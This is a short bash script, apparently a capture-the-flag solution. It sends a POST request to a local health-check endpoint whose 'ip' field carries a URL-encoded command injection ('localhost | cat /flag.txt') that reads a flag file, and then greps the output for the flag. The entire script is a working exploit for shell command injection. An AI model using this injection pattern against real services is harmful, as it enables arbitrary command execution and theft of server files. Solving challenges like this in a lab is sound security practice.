#!/bin/bash

HOST=localhost
PORT=34391
curl -s 'http://'$HOST':'$PORT'/health-check' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'ip=localhost+%7C+cat+%2Fflag.txt' | grep BCC
